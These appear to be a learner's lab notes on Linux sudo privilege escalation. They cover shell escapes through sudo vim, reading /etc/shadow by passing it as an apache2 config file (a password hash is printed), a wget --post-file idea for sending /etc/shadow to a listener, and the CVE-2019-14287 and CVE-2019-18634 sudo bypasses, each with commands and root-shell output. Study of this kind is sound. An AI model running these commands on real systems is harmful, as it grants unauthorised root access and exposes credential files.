## Shell Escaping

We can find the commands our user can run as sudo by typing `sudo -l`

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```

We see that there are several commands we can run as sudo without a password as this user. We can use one of these commands to see whether there is shell escape available though [GTFOBins](https://gtfobins.github.io/). For example we can exploit `vim` as follow.

```bash
TCM@debian:~$ sudo vim -c ':!/bin/sh'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```

## Intended Functionality

There can be situations where a direct path of exploitation is not available based on the sudo commands we have access to. However, we can manipulate the functionalities of tools to gains access to resources as sudo. 

For example, if we can run `apache2` as sudo, we can use the `-f` flag to provide the `/etc/passwd` file as the config file resulting in an error and printing out the first line as the error message.

```bash
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```

Another example is if we can run `wget` as sudo, we can use the `--post-file` command to send the `/etc/shadow` file through  to a listener that we set up.

## LD_PRELOAD

Check [[Privilege Escalation#^f03211|here]] for more details

## CVE-2019-14287

This vulnerability is present in older version of Sudo (< 1.8.28). This can be only exploited in a very specific scenario where a user has a permission in the following format: `<user> ALL=(ALL:!root) NOPASSWD:ALL`

This would let the user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. 

However, if you specify a UID of `-1` (or its unsigned equivalent: `4294967295`), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of `-1` or `4294967295`, you can execute a command as root, despite being explicitly prevented from doing so. [THM Link](https://tryhackme.com/room/sudovulnsbypass)

```bash
tryhackme@sudo-privesc:~$ sudo -l
Matching Defaults entries for tryhackme on sudo-privesc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /bin/bash
    
tryhackme@sudo-privesc:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

tryhackme@sudo-privesc:~$ sudo -u#-1 /bin/bash 
root@sudo-privesc:~# id
uid=0(root) gid=1000(tryhackme) groups=1000(tryhackme)
root@sudo-privesc:~# whoami
root
```


## CVE-2019-18634

By default Linux does not display asterisks when typing a password. However, this can be enabled by editing the `/etc/sudoers` file to include the `pwfeedbak` option.

```bash
# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset,pwfeedback
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

However, when this option is turned on, it is possible to perform a buffer overflow attack on sudo versions < 1.8.26. A source code to exploit this vulnerability can be found [here](https://github.com/saleemrashid/sudo-cve-2019-18634). Once the file is downloaded and complied, we simply need to run it to gain root privileges. [THM Link](https://github.com/saleemrashid/sudo-cve-2019-18634)

```bash
tryhackme@sudo-bof:~$ ls
exploit
tryhackme@sudo-bof:~$ ./exploit 
[sudo] password for tryhackme: 

Sorry, try again.
# # 
# id
uid=0(root) gid=0(root) groups=0(root),1000(tryhackme)
```

